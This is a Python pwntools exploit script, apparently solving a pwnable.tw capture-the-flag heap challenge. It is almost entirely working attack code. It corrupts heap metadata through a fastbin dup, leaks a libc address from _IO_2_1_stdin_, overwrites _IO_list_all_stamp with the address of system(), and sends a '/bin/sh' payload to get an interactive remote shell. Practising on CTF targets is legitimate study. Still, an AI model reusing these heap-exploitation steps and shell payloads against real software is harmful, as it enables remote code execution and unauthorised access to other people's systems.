from pwn import *

io = remote('chall.pwnable.tw', 10306)

io.recvuntil('Enter your name: ')
io.sendline('name')
io.recvuntil('Please input a key: ')
io.sendline('key')
io.recvuntil('Please input a value: ')
io.sendline(str(1))

def edit(name, key_len, key, value):
	io.recvuntil('Your choice: ')
	io.sendline('2')
	io.recvuntil('Enter your name: ')
	io.sendline(name)
	io.recvuntil('New key length: ')
	io.sendline(str(key_len))
	io.recvuntil('Key: ')
	io.sendline(key)
	io.recvuntil('Value: ')
	io.sendline(str(value))

payload = p64(0) + p64(0x71) + p64(0) * 10
payload += p64(0x6032d0) + p64(0) * 2 + p64(0x1000)
edit(payload, 3, 'key', 1)

# overwrite chunk->fd
edit(p64(0) + p64(0x71) + p64(0x603285) + p64(0) * 10, 0x59, 'key', 1)

# leak libc address
edit(p64(0) * 3, 0x5a, b'\0' * 0xb + p64(0x6032e0) + p64(0) * 7 + p64(0x603140), 1)
io.recvuntil('Your data info after editing:\nKey: ')

_IO_2_1_stdin_addr = u64(io.recv(6) + b'\0\0')
_IO_2_1_stdin_offset = 0x3c38e0

libc_base = _IO_2_1_stdin_addr - _IO_2_1_stdin_offset
system_offset = 0x45390

# _IO_list_all_stamp_offset = 0x2
# thus strlen(_IO_list_all_stamp_offset) = 1
# We can therefore bypass: if (new_len > old_len) key = new char[new_len+1];

_IO_list_all_stamp_offset = 0x3c5758
_IO_list_all_stamp_addr = libc_base + _IO_list_all_stamp_offset
system_addr = libc_base + system_offset

# change _IO_list_all_stamp_offset to 0x71 so that the next size is correct
edit(p64(0) + p64(0x71) + p64(0) * 2 + p64(_IO_list_all_stamp_addr), 1, '\x71', 1)

# fastbin dup
payload = p64(0) + p64(0x71) + p64(0) * 2
payload += p64(_IO_list_all_stamp_addr) + p64(0)
payload += p64(0) * 6 + p64(0x6032d0) + p64(0)
payload += p64(0) + p64(0x1000)
edit(payload, 1, '\x71', 1)

payload = p64(0) + p64(0x71) + p64(_IO_list_all_stamp_addr - 0x8) + p64(0)
payload += p64(_IO_list_all_stamp_addr) + p64(0)
payload += p64(0) * 7
edit(payload, 0x58, 'key', 1)
edit(p64(0) * 4 + p64(_IO_list_all_stamp_addr), 0x58, p64(0) * 9 + p64(system_addr), 1)

# trigger system("/bin/sh")
payload = b'/bin/sh\0' + p64(0) * 3 + p64(_IO_list_all_stamp_addr) + p64(0)
payload += p64(0) * 6 + p64(0x6032c0)

io.recvuntil('Your choice: ')
io.sendline('2')
io.recvuntil('Enter your name: ')
io.sendline(payload)

io.interactive()
